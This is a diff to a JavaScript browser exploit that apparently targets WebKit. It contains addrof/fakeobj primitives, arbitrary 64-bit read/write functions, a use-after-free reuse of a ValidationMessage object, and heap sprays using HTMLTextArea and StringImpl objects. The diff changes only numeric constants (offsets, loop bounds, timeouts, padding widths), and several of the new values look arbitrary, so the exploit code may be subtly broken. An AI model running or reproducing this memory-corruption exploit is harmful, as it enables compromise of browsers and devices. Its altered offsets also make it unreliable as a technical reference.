@@ -115,7 +115,7 @@ function setupRW() {
 	/* Set up addrof/fakeobj primitives */
 	g_ab_slave.leakme = 0x1337;
 	var bf = 0;
-	for(var i = 15; i >= 8; i--)
+	for(var i = 10; i >= 8; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
@@ -129,7 +129,7 @@ function setupRW() {
 
 	og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
 	var leak_master = addrof(master_b);
-	write64(leak_master.add(0x10), leak_slave.add(0x10));
+	write64(leak_master.add(0x5), leak_slave.add(0x5));
 	var prim = {
 		write8: function(addr, val) {
 			master_b[0] = addr.low;
@@ -174,7 +174,7 @@ function setupRW() {
 		},
 		leakval: function(val) {
 			g_ab_slave.leakme = val;
-			master_b[0] = g_jsview_butterfly.low32() - 0x10;
+			master_b[0] = g_jsview_butterfly.low32() - 0x5;
 			master_b[1] = g_jsview_butterfly.hi32();
 			var r = new int64(slave_b[0], slave_b[1]);
 			master_b[0] = og_slave_addr.low;
@@ -388,7 +388,7 @@ function reuseTargetObj() {
 	 * Free ValidationMessage neighboors.
 	 * SmallLine is freed -> SmallPage is cached
 	 */
-	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
+	for (let i = NB_FRAMES / 2 - 0x5; i < NB_FRAMES / 2 + 0x5; i++)
 		g_frames[i].setAttribute("rows", ',');
 
 	/* Get back target object */
@@ -413,9 +413,9 @@ function reuseTargetObj() {
 		g_round += 1;
 		g_input = input3;
 
-		setTimeout(confuseTargetObjRound1, 10);
+		setTimeout(confuseTargetObjRound1, 5);
 	} else {
-		setTimeout(confuseTargetObjRound2, 10);
+		setTimeout(confuseTargetObjRound2, 5);
 	}
 }
 
@@ -498,7 +498,7 @@ function sprayHTMLTextArea() {
 /* StringImpl Spray */
 function sprayStringImpl(start, end) {
 	for (let i = start; i < end; i++) {
-		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 10) + i.toString().padStart(5, "0"));
+		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(4, "0"));
 		g_obj_str[s] = 0x1337;
 	}
 }
